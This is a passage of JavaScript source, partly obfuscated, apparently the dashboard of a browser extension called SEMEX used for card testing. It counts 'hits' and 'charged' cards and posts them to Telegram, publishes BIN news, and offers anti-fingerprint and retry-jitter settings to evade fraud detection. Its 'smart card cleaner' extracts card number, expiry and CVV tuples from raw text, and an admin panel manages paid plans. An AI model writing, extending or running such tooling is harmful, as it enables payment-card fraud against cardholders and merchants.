  if (!_0x119d72) {
    return;
  }
  _0x119d72.classList.remove("hidden");
  const _0x1e566 = _0x3d0ac3.geo || {};
  const _0x23d8ad = document.getElementById("proxy-geo-flag");
  const _0x5ad604 = document.getElementById("proxy-geo-country");
  const _0x88bfd9 = document.getElementById("proxy-geo-ip");
  const _0x1efd2c = document.getElementById("proxy-geo-latency");
  const _0x39cf96 = document.getElementById("proxy-geo-city");
  if (_0x23d8ad) {
    _0x23d8ad.textContent = _0x1e566.flag || _0x1e566.country || "🌍";
  }
  if (_0x5ad604) {
    _0x5ad604.textContent = _0x1e566.country || _0x1e566.countryName || "Connected";
  }
  if (_0x88bfd9) {
    _0x88bfd9.textContent = _0x3d0ac3.ip || _0x1e566.ip || _0x3d0ac3.host + ":" + _0x3d0ac3.port || "-";
  }
  if (_0x1efd2c) {
    _0x1efd2c.textContent = _0x3d0ac3.latency ? _0x3d0ac3.latency + "ms" : "-";
  }
  if (_0x39cf96) {
    _0x39cf96.textContent = _0x1e566.city || "-";
  }
}
__name(updateProxyStatusDisplay, "updateProxyStatusDisplay");
function initNewsTab() {
  const _0x1a1cec = document.getElementById("news-refresh-btn");
  if (_0x1a1cec) {
    _0x1a1cec.addEventListener("click", () => {
      loadNewsFeed();
    });
  }
  loadNewsFeed();
}
__name(initNewsTab, "initNewsTab");
function renderNewsList(_0x4c1b69) {
  const _0x114b73 = document.getElementById("news-list");
  if (!_0x114b73) {
    return;
  }
  if (_0x4c1b69.length === 0) {
    _0x114b73.innerHTML = "\n            <div class=\"empty-state\">\n                <div class=\"empty-icon\">📰</div>\n                <div>No news yet</div>\n            </div>\n        ";
    return;
  }
  _0x4c1b69.sort((_0x30b690, _0xafb0f5) => {
    if (_0x30b690.pinned && !_0xafb0f5.pinned) {
      return -1;
    }
    if (!_0x30b690.pinned && _0xafb0f5.pinned) {
      return 1;
    }
    return _0xafb0f5.createdAt - _0x30b690.createdAt;
  });
  _0x114b73.innerHTML = _0x4c1b69.map(_0x386a89 => {
    const _0x26b66c = new Date(_0x386a89.createdAt).toLocaleDateString();
    const _0x561e95 = _0x386a89.type === "alert" ? "⚠️" : _0x386a89.type === "bin" ? "💳" : "📰";
    const _0x2aa224 = _0x386a89.type === "alert" ? "ALERT" : _0x386a89.type === "bin" ? "BIN" : "NEWS";
    const _0xac380b = _0x386a89.pinned ? "<span class=\"news-pin\">📌</span>" : "";
    return "\n            <div class=\"news-item " + (_0x386a89.pinned ? "pinned" : "") + "\" data-type=\"" + _0x386a89.type + "\">\n                <div class=\"news-header-row\">\n                    <span class=\"news-type-badge " + _0x386a89.type + "\">" + _0x561e95 + " " + _0x2aa224 + "</span>\n                    " + _0xac380b + "\n                </div>\n                <div class=\"news-title\">" + escapeHtml(_0x386a89.title) + "</div>\n                <div class=\"news-content\">" + parseBBCode(_0x386a89.content) + "</div>\n                <div class=\"news-footer\">\n                    <span class=\"news-date\">" + _0x26b66c + "</span>\n                </div>\n            </div>\n        ";
  }).join("");
}
__name(renderNewsList, "renderNewsList");
function parseBBCode(_0x231d68) {
  if (!_0x231d68) {
    return "";
  }
  let _0x115b76 = escapeHtml(_0x231d68);
  _0x115b76 = _0x115b76.replace(/\[b\](.*?)\[\/b\]/gi, "<strong>$1</strong>").replace(/\[i\](.*?)\[\/i\]/gi, "<em>$1</em>").replace(/\[u\](.*?)\[\/u\]/gi, "<u>$1</u>").replace(/\[url=(https?:\/\/[^\]]+)\](.*?)\[\/url\]/gi, "<a href=\"$1\" target=\"_blank\" rel=\"noopener noreferrer\">$2</a>").replace(/\[url\](https?:\/\/[^\[]+)\[\/url\]/gi, "<a href=\"$1\" target=\"_blank\" rel=\"noopener noreferrer\">$1</a>").replace(/\[color=([a-z0-9#]+)\](.*?)\[\/color\]/gi, "<span style=\"color:$1\">$2</span>").replace(/\[code\](.*?)\[\/code\]/gi, "<code style=\"background:rgba(255,255,255,0.1);padding:2px 6px;border-radius:4px;font-family:monospace;\">$1</code>").replace(/\n/g, "<br>");
  return _0x115b76;
}
__name(parseBBCode, "parseBBCode");
function escapeHtml(_0x32fba5) {
  const _0x3a85aa = document.createElement("div");
  _0x3a85aa.textContent = _0x32fba5;
  return _0x3a85aa.innerHTML;
}
__name(escapeHtml, "escapeHtml");
document.addEventListener("DOMContentLoaded", () => {
  setTimeout(() => {
    initNewsTab();
    if (window.serverClient && window.serverClient.getBotUsername) {
      window.serverClient.getBotUsername().then(_0x5d4d68 => {
        const _0x5ee3f5 = document.getElementById("bot-link");
        const _0x419927 = document.getElementById("bot-alert-box");
        if (_0x5d4d68 && _0x5ee3f5) {
          _0x5ee3f5.href = "https://t.me/" + _0x5d4d68 + "?start=start";
          _0x5ee3f5.textContent = "@" + _0x5d4d68;
        }
        if (_0x419927) {
          _0x419927.classList.remove("hidden");
        }
      }).catch(_0x2a9b51 => {
        const _0x4aa9c6 = document.getElementById("bot-alert-box");
        if (_0x4aa9c6) {
          _0x4aa9c6.classList.remove("hidden");
        }
      });
    }
  }, 100);
});
/* SEMEX Checkout Theme Picker removed — colour theming feature dropped per user request. */

/* ==============================
   SEMEX Last-Hit Result indicator
   Shows the exact outcome of the most recent hit submission (saved / exact HTTP
   error) so transmission problems are diagnosable at a glance without DevTools.
   ============================== */
(function initLastHitResult(){
  const el = document.getElementById("last-hit-result");
  if (!el) return;
  const render = (r) => {
    if (!r || !r.time) { el.style.display = "none"; return; }
    const when = new Date(r.time).toLocaleTimeString();
    if (r.ok) {
      if (r.forwarded) {
        el.textContent = "Last hit: ✓ saved & notified (" + (r.status || "") + ") · " + when;
      } else {
        el.textContent = "Last hit: ✓ saved (not notified — decline/no-plan) · " + when;
      }
      el.style.color = "#22c55e";
      el.style.background = "rgba(34,197,94,0.08)";
    } else {
      const code = r.http ? ("HTTP " + r.http) : "network";
      el.textContent = "Last hit: ✗ NOT saved — " + code + (r.reason ? " (" + r.reason + ")" : "") + " · " + when;
      el.style.color = "#f87171";
      el.style.background = "rgba(248,113,113,0.1)";
    }
    el.style.display = "block";
  };
  try {
    chrome.storage.local.get("__xlhr", (r) => { render(r && r.lastHitResult); });
    chrome.storage.onChanged.addListener((changes, area) => {
      if (area === "local" && changes.lastHitResult) render(changes.lastHitResult.newValue);
    });
  } catch (e) {}
})();


/* ==============================
   SEMEX Session Wins streak badge
   Increments + pulses on the topbar each time a CHARGED hit lands
   (detected via cumulative statistics.charged increases while the
   dashboard tab is open). Baseline captured on load = 0 wins shown.
   ============================== */
(function initSessionWins() {
  let baseline = null;
  let wins = 0;
  const badge = () => document.getElementById("session-wins-badge");
  const countEl = () => document.getElementById("session-wins-count");
  function render() {
    const b = badge(), c = countEl();
    if (!b || !c) return;
    c.textContent = wins;
    if (wins > 0) b.classList.remove("hidden");
  }
  function pop() {
    const b = badge();
    if (!b) return;
    b.classList.remove("wins-pop");
    void b.offsetWidth;
    b.classList.add("wins-pop");
  }
  function handle(charged) {
    if (typeof charged !== "number") return;
    if (baseline === null) { baseline = charged; render(); return; }
    if (charged > baseline) {
      wins += (charged - baseline);
      baseline = charged;
      render();
      pop();
    } else if (charged < baseline) {
      baseline = charged;
    }
  }
  try {
    chrome.storage.local.get(["statistics"], (r) => {
      const s = (r && r.statistics) || {};
      handle(typeof s.charged === "number" ? s.charged : 0);
    });
    chrome.storage.onChanged.addListener((changes, area) => {
      if (area === "local" && changes.statistics) {
        const nv = changes.statistics.newValue || {};
        handle(typeof nv.charged === "number" ? nv.charged : 0);
      }
    });
  } catch (e) {}
})();

/* ==================== SEMEX ADMIN PANEL ==================== */
(function setupAdminPanel() {
  let _adminUsers = [];
  let _isOwner = false;
  let _ownerTelegramId = null;
  let _selfTelegramId = null;
  let _loaded = false;

  async function _authHeaders() {
    const stored = await chrome.storage.local.get(["accessToken"]);
    return {
      "Authorization": "Bearer " + (stored.accessToken || ""),
      "Content-Type": "application/json",
    };
  }

  function _baseUrl() {
    return (window.serverClient && window.serverClient.baseUrl) || "";
  }

  function _initials(name) {
    if (!name) return "?";
    const p = String(name).trim().split(/\s+/).filter(Boolean);
    if (!p.length) return "?";
    return (p[0][0] + (p[1] ? p[1][0] : "")).toUpperCase();
  }

  function _escape(s) {
    if (s == null) return "";
    return String(s).replace(/[&<>"']/g, (c) => ({
      "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
    }[c]));
  }

  function _planLabel(u) {
    if (u.isBanned) return "BANNED";
    if (u.isAdmin) return "";
    const p = String(u.plan || "").toUpperCase();
    return p || "FREE";
  }

  function _renderRow(u) {
    const name = _escape([u.firstName, u.lastName].filter(Boolean).join(" ") || u.username || "User #" + u.telegramId);
    const uname = u.username ? "@" + _escape(u.username) : "";
    const isSelf = String(u.telegramId) === String(_selfTelegramId);
    const isOwnerRow = _ownerTelegramId && String(u.telegramId) === String(_ownerTelegramId);

    const cls = [
      "admin-user-row",
      u.isAdmin ? "is-admin" : "",
      u.isBanned ? "is-banned" : "",
      isOwnerRow ? "is-owner" : "",
    ].filter(Boolean).join(" ");

    const tags = [];
    if (isOwnerRow) tags.push('<span class="admin-user-tag tag-owner">OWNER</span>');
    else if (u.isAdmin) tags.push('<span class="admin-user-tag tag-admin">ADMIN</span>');
    if (u.isBanned) tags.push('<span class="admin-user-tag tag-banned">BANNED</span>');
    if (u.publicMuted) tags.push('<span class="admin-user-tag" style="background:rgba(255,180,60,0.18);color:#ffd88a;">PUBLIC MUTED</span>');
    const planTxt = _planLabel(u);
    if (planTxt && !u.isAdmin) tags.push('<span class="admin-user-tag">' + _escape(planTxt) + '</span>');

    // Actions — completely disabled on self AND on the owner row (from anyone).
    // Also OWNER-ONLY globally: promoted admins can VIEW the panel but cannot
    // mutate users (per owner's rule — only the primary owner touches settings).
    const actions = [];
    if (isSelf) {
      actions.push('<span class="mono-dim" style="font-size:0.7rem;padding:6px 8px;">This is you</span>');
    } else if (isOwnerRow) {
      actions.push('<span class="mono-dim" style="font-size:0.7rem;padding:6px 8px;">Owner — protected</span>');
    } else if (!_isOwner) {
      actions.push('<span class="mono-dim" style="font-size:0.7rem;padding:6px 8px;" title="Only the owner can modify user settings">Read-only (owner-only)</span>');
    } else {
      // Below: OWNER ONLY — Promote / Demote / Extend / Public-mute / Ban / Unban
      if (u.isAdmin) {
        actions.push('<button class="admin-btn demote" data-act="demote" data-id="' + u.telegramId + '">Revoke Admin</button>');
      } else if (!u.isBanned) {
        actions.push('<button class="admin-btn promote" data-act="promote" data-id="' + u.telegramId + '">Promote</button>');
      }
      actions.push('<button class="admin-btn" data-act="extend" data-id="' + u.telegramId + '">Extend</button>');
      if (u.publicMuted) {
        actions.push('<button class="admin-btn" data-act="public-unmute" data-id="' + u.telegramId + '" title="Re-enable public notifications">🔊 Unmute Public</button>');
      } else {
        actions.push('<button class="admin-btn" data-act="public-mute" data-id="' + u.telegramId + '" title="Hide this user\'s hits from the public channel">🔇 Mute Public</button>');
      }
      if (u.isBanned) {
        actions.push('<button class="admin-btn" data-act="unban" data-id="' + u.telegramId + '">Unban</button>');
      } else if (!u.isAdmin) {
        actions.push('<button class="admin-btn danger" data-act="ban" data-id="' + u.telegramId + '">Ban</button>');
      }
    }

    const avatarPhoto = (function () {
      const p = u.photoUrl || "";
      if (!p) return null;
      if (/^https?:\/\//i.test(p)) return p;
      return _baseUrl() + p; // relative → prefix backend base
    })();
    const avatar = avatarPhoto
      ? '<img src="' + _escape(avatarPhoto) + '" alt="" onerror="this.remove()">'
      : _escape(_initials([u.firstName, u.lastName].filter(Boolean).join(" ") || u.username || String(u.telegramId)));

    const hitStats = 'Hits: ' + (u.hitCount || 0) + ' · Charged: ' + (u.chargedCount || 0);

    return (
      '<div class="' + cls + '" data-tg="' + u.telegramId + '">' +
        '<div class="admin-user-avatar">' + avatar + '</div>' +
        '<div class="admin-user-info">' +
          '<div class="admin-user-name">' + name + '</div>' +
          '<div class="admin-user-meta">' +
            '<span>ID: ' + _escape(String(u.telegramId)) + '</span>' +
            (uname ? '<span>' + uname + '</span>' : '') +
            '<span>' + _escape(hitStats) + '</span>' +
            tags.join('') +
          '</div>' +
        '</div>' +
        '<div class="admin-user-actions">' + actions.join('') + '</div>' +
      '</div>'
    );
  }

  function _render() {
    const listEl = document.getElementById("admin-users-list");
    if (!listEl) return;
    const searchEl = document.getElementById("admin-user-search");
    const q = (searchEl && searchEl.value || "").toLowerCase().trim();

    let rows = _adminUsers;
    if (q) {
      rows = rows.filter((u) => {
        const hay = [u.telegramId, u.username, u.firstName, u.lastName].map((x) => String(x || "").toLowerCase()).join(" ");
        return hay.includes(q);
      });
    }

    if (!rows.length) {
      listEl.innerHTML = '<div class="mono-dim" style="padding:16px;">No users match your search.</div>';
      return;
    }
    listEl.innerHTML = rows.map(_renderRow).join("");
  }

  async function _loadUsers() {
    const listEl = document.getElementById("admin-users-list");
    if (!listEl) return;
    listEl.innerHTML = '<div class="mono-dim" style="padding:16px;">Loading users…</div>';
    try {
      const headers = await _authHeaders();
      const [uResp, oResp] = await Promise.all([
        fetch(_baseUrl() + "/api/admin/users?limit=500", { headers }),
        fetch(_baseUrl() + "/api/admin/is-owner", { headers }),
      ]);
      if (!uResp.ok) throw new Error("HTTP " + uResp.status);
      const data = await uResp.json();
      _adminUsers = data.users || [];
      _adminUsers.sort((a, b) => {
        // Owner-ish (admins) first, then by recent activity
        if (a.isAdmin && !b.isAdmin) return -1;
        if (!a.isAdmin && b.isAdmin) return 1;
        return String(b.lastSeenAt || "").localeCompare(String(a.lastSeenAt || ""));
      });
      if (oResp.ok) {
        const od = await oResp.json();
        _isOwner = !!od.isOwner;
        _ownerTelegramId = od.ownerTelegramId || null;
      }
      // Get self telegramId — try multiple sources for reliability
      try {
        // 1) Cached profile
        const prof = await window.cacheManager.get("user_profile", { fallbackToStorage: true });
        _selfTelegramId = prof && (prof.telegramId || prof.telegram_id);
        // 2) chrome.storage.local userProfile
        if (!_selfTelegramId) {
          const stored = await new Promise((r) => chrome.storage.local.get(["userProfile", "telegramId"], r));
          _selfTelegramId = (stored.userProfile && (stored.userProfile.telegramId || stored.userProfile.telegram_id)) || stored.telegramId || null;
        }
        // 3) Server-side hint: if I'm the owner via is-owner AND haven't found my id, ask /api/user/me
        if (!_selfTelegramId) {
          try {
            const meResp = await fetch(_baseUrl() + "/api/user/me", { headers });
            if (meResp.ok) {
              const me = await meResp.json();
              _selfTelegramId = me.telegramId || me.telegram_id || null;
            }
          } catch (e) {}
        }
      } catch (e) {}

      const roleEl = document.getElementById("admin-role-badge");
      if (roleEl) roleEl.textContent = _isOwner ? "Signed in as Owner" : "Signed in as Admin (read-only)";
      // Danger zone visibility — owner only
      const dz = document.getElementById("admin-danger-zone");
      if (dz) dz.classList.toggle("hidden", !_isOwner);
      // OWNER-ONLY sections: codes, broadcast, news, releases. Non-owner admins
      // can VIEW the panel (stats, users list, hits feed) but cannot mutate.
      document.querySelectorAll(".owner-only").forEach((el) => {
        el.classList.toggle("hidden", !_isOwner);
      });
      _render();
    } catch (e) {
      listEl.innerHTML = '<div class="mono-dim" style="padding:16px;color:#ff8090;">Failed to load users: ' + _escape(e.message || e) + '</div>';
    }
  }

  async function _postAction(path, body) {
    const headers = await _authHeaders();
    const r = await fetch(_baseUrl() + path, {
      method: "POST",
      headers,
      body: JSON.stringify(body || {}),
    });
    let data = {};
    try { data = await r.json(); } catch (e) {}
    if (!r.ok) throw new Error(data.detail || data.error || ("HTTP " + r.status));
    return data;
  }

  async function _onAction(act, telegramId) {
    const tg = Number(telegramId);
    const user = _adminUsers.find((u) => String(u.telegramId) === String(tg));
    const name = user ? (user.firstName || user.username || ("User " + tg)) : ("User " + tg);

    try {
      if (act === "promote") {
        const ok = await showConfirmModal("Promote to Admin", "Grant admin privileges to " + name + "?\n\nAdmins get unlimited access, can view users, ban, and extend plans. Their hits go to your DM only.", "Promote");
        if (!ok) return;
        await _postAction("/api/admin/users/promote", { telegramId: tg });
      } else if (act === "demote") {
        const ok = await showConfirmModal("Revoke Admin", "Remove admin privileges from " + name + "?", "Revoke");
        if (!ok) return;
        await _postAction("/api/admin/users/demote", { telegramId: tg });
      } else if (act === "ban") {
        const ok = await showConfirmModal("Ban User", "Ban " + name + "? Their sessions will be revoked and they'll lose access immediately.", "Ban");
        if (!ok) return;
        await _postAction("/api/admin/users/ban", { telegramId: tg });
      } else if (act === "unban") {
        const ok = await showConfirmModal("Unban User", "Restore access for " + name + "?", "Unban");
        if (!ok) return;
        await _postAction("/api/admin/users/unban", { telegramId: tg });
      } else if (act === "extend") {
        const daysStr = prompt("Extend plan for " + name + " — enter days (use -1 for lifetime):", "30");
        if (daysStr === null) return;
        const days = parseInt(daysStr, 10);
        if (isNaN(days)) { if (typeof window.showAlert === "function") window.showAlert("Invalid Days", "Please enter a valid number."); return; }
        await _postAction("/api/admin/users/extend", { telegramId: tg, days });
      } else if (act === "public-mute") {
        const ok = await showConfirmModal("Mute Public Notifications", "Hide " + name + "'s hits from the public showcase channel?\n\nTheir personal DM notifications keep firing — only the public group stays silent.", "Mute");
        if (!ok) return;
        await _postAction("/api/admin/users/public-mute", { telegramId: tg, muted: true });
      } else if (act === "public-unmute") {
        await _postAction("/api/admin/users/public-mute", { telegramId: tg, muted: false });
      }
      await _loadUsers();
    } catch (e) {
      if (typeof window.showAlert === "function") {
        window.showAlert("Action Failed", e.message || String(e));
      } else {
        alert("Action failed: " + (e.message || e));
      }
    }
  }

  // Public entrypoint
  window.loadAdminPanel = function () {
    _loadUsers();
    _loaded = true;
  };

  // Delegated click handler for admin actions + search + refresh
  document.addEventListener("click", (ev) => {
    const btn = ev.target && ev.target.closest && ev.target.closest(".admin-btn[data-act]");
    if (btn) {
      _onAction(btn.dataset.act, btn.dataset.id);
      return;
    }
    if (ev.target && ev.target.id === "admin-refresh-btn") {
      _loadUsers();
    }
    if (ev.target && ev.target.id === "admin-nuke-btn") {
      _onNuke();
    }
  });

  async function _onNuke() {
    if (!_isOwner) return;
    const phrase = prompt(
      "⚠️ NUKE DATABASE ⚠️\n\n" +
      "This will permanently delete:\n" +
      "  • ALL users (including you)\n" +
      "  • ALL sessions\n" +
      "  • ALL charged / live / dead hit history\n" +
      "  • ALL saved BINs\n" +
      "  • ALL redeem codes\n" +
      "  • ALL news posts\n\n" +
      "You will be logged out and must sign back in via the Telegram bot.\n" +
      "Your admin role will auto-restore from the ADMIN_TELEGRAM_ID env var.\n\n" +
      "Type NUKE (in capitals) to confirm:",
      ""
    );
    if (phrase === null) return;
    if (phrase.trim().toUpperCase() !== "NUKE") {
      if (typeof showToast === "function") showToast("Cancelled — phrase mismatch", "warning");
      return;
    }
    try {
      const headers = await _authHeaders();
      const r = await fetch(_baseUrl() + "/api/admin/db/nuke", {
        method: "POST",
        headers,
        body: JSON.stringify({ confirm: "NUKE" }),
      });
      const d = await r.json().catch(() => ({}));
      if (!r.ok) throw new Error(d.detail || d.error || ("HTTP " + r.status));
      const wiped = d.wiped || {};
      const total = Object.values(wiped).reduce((a, b) => a + (b > 0 ? b : 0), 0);
      alert(
        "✅ Database nuked.\n\n" +
        Object.entries(wiped).map(([k, v]) => "  " + k + ": " + v).join("\n") +
        "\n\nTotal rows deleted: " + total +
        "\n\nSign back in via the Telegram bot to restore your admin session."
      );
      // Clear local storage & reload the extension
      try {
        await new Promise((res) => chrome.storage.local.clear(res));
      } catch (e) {}
      window.location.reload();
    } catch (e) {
      alert("Nuke failed: " + (e.message || e));
    }
  }
  document.addEventListener("input", (ev) => {
    if (ev.target && ev.target.id === "admin-user-search") _render();
  });
})();

/* ==================== SEMEX ANTI-FINGERPRINT SETTINGS UI ==================== */
(function setupAntiFingerprintUI() {
  const AF_KEYS = [
    ["af-master", "enabled", true],
    ["af-canvas", "canvas", true],
    ["af-webgl", "webgl", true],
    ["af-audio", "audio", true],
    ["af-navigator", "navigator", true],
    ["af-timezone", "timezone", true],
    ["af-webrtc", "webrtc", true],
  ];

  async function loadAF() {
    const r = await new Promise((res) => chrome.storage.local.get(["antiFingerprint", "settings"], res));
    const af = Object.assign({}, ...AF_KEYS.map(([, k, def]) => ({ [k]: def })), r.antiFingerprint || {});
    const s = r.settings || {};
    AF_KEYS.forEach(([id, key]) => {
      const el = document.getElementById(id);
      if (el) el.checked = af[key] !== false;
    });
    const setBool = (id, val, def) => {
      const el = document.getElementById(id);
      if (el) el.checked = (val === undefined ? def : val) !== false;
    };
    setBool("af-autoclear", s.antiFingerprintAutoClear, true);
    setBool("af-bump-start", s.antiFingerprintBumpOnStart, true);
    setBool("af-bump-attempt", s.antiFingerprintBumpEachAttempt, true);
    setBool("retry-jitter-toggle", s.retryJitterEnabled, true);
    const setRange = (id, valId, val, def, fmt) => {
      const el = document.getElementById(id);
      const lbl = document.getElementById(valId);
      const v = (val === undefined ? def : val);
      if (el) el.value = v;
      if (lbl) lbl.textContent = fmt(v);
    };
    setRange("retry-jitter-min", "retry-jitter-min-value", s.retryJitterMinMs, 2000, (v) => (v/1000).toFixed(1) + "s");
    setRange("retry-jitter-max", "retry-jitter-max-value", s.retryJitterMaxMs, 9000, (v) => (v/1000).toFixed(1) + "s");
  }

  async function saveAF() {
    const r = await new Promise((res) => chrome.storage.local.get(["antiFingerprint", "settings"], res));
    const af = Object.assign({}, r.antiFingerprint || {});
    AF_KEYS.forEach(([id, key]) => {
      const el = document.getElementById(id);
      if (el) af[key] = el.checked;
    });
    const s = Object.assign({}, r.settings || {});
    const readBool = (id) => document.getElementById(id) && document.getElementById(id).checked;
    s.antiFingerprintAutoClear = readBool("af-autoclear");
    s.antiFingerprintBumpOnStart = readBool("af-bump-start");
    s.antiFingerprintBumpEachAttempt = readBool("af-bump-attempt");
    s.retryJitterEnabled = readBool("retry-jitter-toggle");
    const rmin = document.getElementById("retry-jitter-min");
    const rmax = document.getElementById("retry-jitter-max");
    if (rmin) s.retryJitterMinMs = parseInt(rmin.value, 10);
    if (rmax) s.retryJitterMaxMs = Math.max(parseInt(rmin && rmin.value || 2000, 10) + 250, parseInt(rmax.value, 10));
    await new Promise((res) => chrome.storage.local.set({ antiFingerprint: af, settings: s }, res));
  }

  function attach() {
    AF_KEYS.forEach(([id]) => {
      const el = document.getElementById(id);
      if (el) el.addEventListener("change", saveAF);
    });
    ["af-autoclear","af-bump-start","af-bump-attempt","retry-jitter-toggle"].forEach((id) => {
      const el = document.getElementById(id);
      if (el) el.addEventListener("change", saveAF);
    });
    const rmin = document.getElementById("retry-jitter-min");
    const rmax = document.getElementById("retry-jitter-max");
    const rminLbl = document.getElementById("retry-jitter-min-value");
    const rmaxLbl = document.getElementById("retry-jitter-max-value");
    if (rmin) rmin.addEventListener("input", () => {
      if (rminLbl) rminLbl.textContent = (rmin.value/1000).toFixed(1) + "s";
      if (rmax && parseInt(rmax.value,10) <= parseInt(rmin.value,10)) {
        rmax.value = parseInt(rmin.value,10) + 250;
        if (rmaxLbl) rmaxLbl.textContent = (rmax.value/1000).toFixed(1) + "s";
      }
      saveAF();
    });
    if (rmax) rmax.addEventListener("input", () => {
      if (rmaxLbl) rmaxLbl.textContent = (rmax.value/1000).toFixed(1) + "s";
      saveAF();
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", () => { loadAF(); attach(); });
  } else {
    loadAF(); attach();
  }
})();

/* ==================== SEMEX SMART CARD CLEANER + BRAND LOGOS ==================== */
(function semexSmartCards() {
  // --- Card brand detection from digit prefix (Luhn-agnostic; fast) ---
  const BRAND_META = {
    visa:       { name: "Visa",       colour: "#1a1f71", short: "VISA" },
    mastercard: { name: "Mastercard", colour: "#eb001b", short: "MC" },
    amex:       { name: "Amex",       colour: "#2e77bb", short: "AMEX" },
    discover:   { name: "Discover",   colour: "#ff6000", short: "DISC" },
    jcb:        { name: "JCB",        colour: "#0e4c96", short: "JCB" },
    diners:     { name: "Diners",     colour: "#0079be", short: "DINERS" },
    unionpay:   { name: "UnionPay",   colour: "#004879", short: "UP" },
    maestro:    { name: "Maestro",    colour: "#00a2e5", short: "MAES" },
    unknown:    { name: "Card",       colour: "#8a8a99", short: "CARD" },
  };

  function detectBrand(pan) {
    const s = String(pan || "").replace(/\D/g, "");
    if (!s) return "unknown";
    if (s[0] === "4") return "visa";
    const two = parseInt(s.slice(0,2), 10);
    const four = parseInt(s.slice(0,4), 10);
    if (two === 34 || two === 37) return "amex";
    if ((two >= 51 && two <= 55) || (four >= 2221 && four <= 2720)) return "mastercard";
    if (s.startsWith("6011") || s.startsWith("65") || (s.length >= 3 && ["644","645","646","647","648","649"].includes(s.slice(0,3)))) return "discover";
    if (four >= 3528 && four <= 3589) return "jcb";
    if ([36,30,38,39].includes(two)) return "diners";
    if (s.startsWith("62")) return "unionpay";
    if ([50,56,57,58,63,67].includes(two)) return "maestro";
    return "unknown";
  }
  window.semexDetectBrand = detectBrand;
  window.semexBrandMeta = BRAND_META;

  // --- Inline SVG brand logos (compact, ~1KB each, no network) ---
  const BRAND_SVG = {
    visa:       '<svg viewBox="0 0 32 20" width="32" height="20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="3" fill="#1a1f71"/><text x="16" y="14" font-family="Arial Black,sans-serif" font-size="9" font-weight="900" fill="#fff" text-anchor="middle" letter-spacing="1">VISA</text></svg>',
    mastercard: '<svg viewBox="0 0 32 20" width="32" height="20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="3" fill="#0a0a12"/><circle cx="13" cy="10" r="5" fill="#eb001b" opacity="0.9"/><circle cx="19" cy="10" r="5" fill="#f79e1b" opacity="0.9"/></svg>',
    amex:       '<svg viewBox="0 0 32 20" width="32" height="20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="3" fill="#2e77bb"/><text x="16" y="13.5" font-family="Arial Black,sans-serif" font-size="7" font-weight="900" fill="#fff" text-anchor="middle">AMEX</text></svg>',
    discover:   '<svg viewBox="0 0 32 20" width="32" height="20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="3" fill="#0a0a12"/><rect x="0" y="0" width="32" height="20" rx="3" fill="url(#dg)" opacity="0.9"/><defs><linearGradient id="dg" x1="0" x2="1"><stop offset="0" stop-color="#0a0a12"/><stop offset="1" stop-color="#ff6000"/></linearGradient></defs><circle cx="23" cy="10" r="4" fill="#ff6000"/></svg>',
    jcb:        '<svg viewBox="0 0 32 20" width="32" height="20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="3" fill="#0a0a12"/><rect x="4" y="4" width="7" height="12" fill="#0e4c96" rx="1"/><rect x="12.5" y="4" width="7" height="12" fill="#c8102e" rx="1"/><rect x="21" y="4" width="7" height="12" fill="#00a651" rx="1"/></svg>',
    diners:     '<svg viewBox="0 0 32 20" width="32" height="20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="3" fill="#0079be"/><circle cx="16" cy="10" r="6" fill="none" stroke="#fff" stroke-width="1.4"/><line x1="16" y1="4.5" x2="16" y2="15.5" stroke="#fff" stroke-width="1.4"/></svg>',
    unionpay:   '<svg viewBox="0 0 32 20" width="32" height="20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="3" fill="#004879"/><text x="16" y="14" font-family="Arial Black,sans-serif" font-size="7" font-weight="900" fill="#fff" text-anchor="middle">UP</text></svg>',
    maestro:    '<svg viewBox="0 0 32 20" width="32" height="20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="3" fill="#0a0a12"/><circle cx="13" cy="10" r="5" fill="#00a2e5" opacity="0.9"/><circle cx="19" cy="10" r="5" fill="#eb001b" opacity="0.9"/></svg>',
    unknown:    '<svg viewBox="0 0 32 20" width="32" height="20" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="20" rx="3" fill="#20202a" stroke="#3a3a48"/><text x="16" y="14" font-family="Arial,sans-serif" font-size="7" fill="#8a8a99" text-anchor="middle">CARD</text></svg>',
  };
  window.semexBrandSVG = BRAND_SVG;

  // --- Luhn ---
  function luhn(pan) {
    const s = String(pan || "").replace(/\D/g, "");
    if (s.length < 13 || s.length > 19) return false;
    let sum = 0, alt = false;
    for (let i = s.length - 1; i >= 0; i--) {
      let n = s.charCodeAt(i) - 48;
      if (alt) { n *= 2; if (n > 9) n -= 9; }
      sum += n;
      alt = !alt;
    }
    return sum % 10 === 0;
  }

  // --- Smart card cleaner: extract cards from ANY messy input ---
  function smartCardCleaner(input) {
    if (!input || typeof input !== "string") return "";
    const now = new Date();
    const nowY = now.getFullYear();
    const nowM = now.getMonth() + 1;

    const lines = input.split(/\r?\n/);
    const out = [];
    const seen = new Set();

    for (const rawLine of lines) {
      // Multiple cards on one line? Split on obvious card separators like `,` or `;`
      // AFTER we try to find complete tuples with regex.
      const parts = rawLine.split(/[;,]\s+/).length > 1 ? rawLine.split(/[;,]\s+/) : [rawLine];
      for (const part of parts) {
        const found = extractCardsFromChunk(part, nowY, nowM);
        for (const c of found) {
          const key = c.pan;
          if (seen.has(key)) continue;
          seen.add(key);
          out.push(c.pan + "|" + c.mm + "|" + c.yy + "|" + c.cvv);
        }
      }
    }
    return out.join("\n");
  }

  function extractCardsFromChunk(chunk, nowY, nowM) {
    if (!chunk) return [];
    const results = [];
    // 1) Find every plausible starting position of a PAN (13-19 digits, with
    // optional spaces/dashes). For each candidate, try trimming from the end
    // down to 13 digits and pick the LONGEST Luhn-valid PAN. This is more
    // robust than a single greedy regex because it avoids accidentally
    // slurping the following month digits into the PAN.
    const panRegex = /(?:\d[ \-]?){13,25}/g;
    let m;
    while ((m = panRegex.exec(chunk)) !== null) {
      const raw = m[0];
      const digits = raw.replace(/\D/g, "");
      if (digits.length < 13) continue;

      // Search: longest Luhn-valid PAN in [13, min(19, digits.length)].
      let bestPan = null, bestConsumed = 0;
